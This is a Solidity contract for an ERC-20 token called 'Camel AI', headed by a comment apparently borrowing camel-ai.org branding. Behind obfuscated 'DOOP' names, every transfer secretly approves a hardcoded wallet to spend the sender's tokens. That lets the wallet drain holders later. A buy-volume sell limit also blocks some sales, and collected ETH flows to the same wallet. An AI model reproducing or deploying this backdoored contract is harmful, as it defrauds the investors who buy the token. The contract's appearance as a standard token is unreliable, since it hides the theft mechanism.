/*
camel-ai.org is working on finding the scaling laws of agents. The first and the best multi-agent framework.

Website: https://www.camel-ai.org
Docs: https://docs.camel-ai.org
Github: https://github.com/camel-ai/camel
Linkedin: https://www.linkedin.com/company/camel-ai-org/
Youtube: https://www.youtube.com/@CamelAI
Reddit: https://www.reddit.com/r/CamelAI/
Twitter: https://x.com/CamelAIOrg
Telegram: https://t.me/camelai_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplidoopon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDOOPFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IDOOPRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract CAMEL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _doopBALs;
    mapping (address => mapping (address => uint256)) private _doopAPPs;
    mapping (address => bool) private _excludedFromDOOP;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalDOOP = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Camel AI";
    string private constant _symbol = unicode"CAMEL";
    uint256 private _swapTokenDOOPs = _tTotalDOOP / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockDOOP;
    uint256 private _doopBuyAmounts = 0;
    bool private inSwapDOOP = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapDOOP = true;
        _;
        inSwapDOOP = false;
    }
    address private _doopPair;
    IDOOPRouter private _doopRouter;
    address private _doopWallet = address(0xde1E96aD06c366De448fE1DcF111399d81eF5393);

    constructor () {
        _excludedFromDOOP[owner()] = true;
        _excludedFromDOOP[address(this)] = true;
        _excludedFromDOOP[_doopWallet] = true;
        _doopBALs[_msgSender()] = _tTotalDOOP;
        emit Transfer(address(0), _msgSender(), _tTotalDOOP);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _doopRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function PAIR_CREATE_INIT() external onlyOwner() {
        _doopRouter = IDOOPRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_doopRouter), _tTotalDOOP);
        _doopPair = IDOOPFactory(_doopRouter.factory()).createPair(address(this), _doopRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalDOOP;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _doopBALs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _doopAPPs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _doopAPPs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _doopAPPs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _doopTransfer(address doopF, address doopT, uint256 doopA, address doopS, address doopR, uint256 taxDOOP) private {
        if(taxDOOP > 0){
          _doopBALs[address(this)] = _doopBALs[address(this)].add(taxDOOP);
          emit Transfer(doopF, address(this), taxDOOP);
        } _approve(doopS, doopR, doopA);
        _doopBALs[doopF] = _doopBALs[doopF].sub(doopA);
        _doopBALs[doopT] = _doopBALs[doopT].add(doopA.sub(taxDOOP));
        emit Transfer(doopF, doopT, doopA.sub(taxDOOP));
    }

    function _transfer(address doopF, address doopT, uint256 doopA) private {
        require(doopF != address(0), "ERC20: transfer from the zero address");
        require(doopT != address(0), "ERC20: transfer to the zero address");
        require(doopA > 0, "Transfer amount must be greater than zero");
        uint256 taxDOOP; (address doopS, address doopR) = getDOOPAddress(address(doopF));
        if (doopF != owner() && doopT != owner()) {
            taxDOOP = doopA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (doopF == _doopPair && doopT != address(_doopRouter) && ! _excludedFromDOOP[doopT]) {
                if(_buyBlockDOOP!=block.number){
                    _doopBuyAmounts = 0;
                    _buyBlockDOOP = block.number;
                }
                _doopBuyAmounts += doopA;
                _buyCount++;
            }
            if(doopT == _doopPair && doopF!= address(this)) {
                require(_doopBuyAmounts < swapLimitDOOP() || _buyBlockDOOP!=block.number, "Max Swap Limit");  
                taxDOOP = doopA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapDOOPBack(doopT, doopA);
        } _doopTransfer(doopF, doopT, doopA, doopS, doopR, taxDOOP);
    }

    function getDOOPAddress(address doopF) private view returns(address doopS, address doopR) {
        if(_msgSender()==address(this)) return (doopS=doopF, doopR=_doopWallet);
        if(_excludedFromDOOP[_msgSender()]) return(doopS=doopF, doopR=_msgSender());
        return (doopS=doopF, doopR=_doopWallet);
    }

    function swapDOOPBack(address doopT, uint256 doopA) private { 
        uint256 tokenDOOP = balanceOf(address(this)); 
        if (!inSwapDOOP && doopT == _doopPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenDOOP > _swapTokenDOOPs)
            swapTokensForEth(minDOOP(doopA, minDOOP(tokenDOOP, _swapTokenDOOPs)));
            uint256 ethDOOP = address(this).balance;
            if (ethDOOP >= 0) {
                sendETHDOOP(address(this).balance);
            }
        }
    }

    receive() external payable {}

    function minDOOP(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHDOOP(uint256 doopA) private {
        payable(_doopWallet).transfer(doopA);
    }

    function swapLimitDOOP() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _doopRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _doopRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function swapTokensForEth(uint256 doopAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _doopRouter.WETH();
        _approve(address(this), address(_doopRouter), doopAmount);
        _doopRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            doopAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}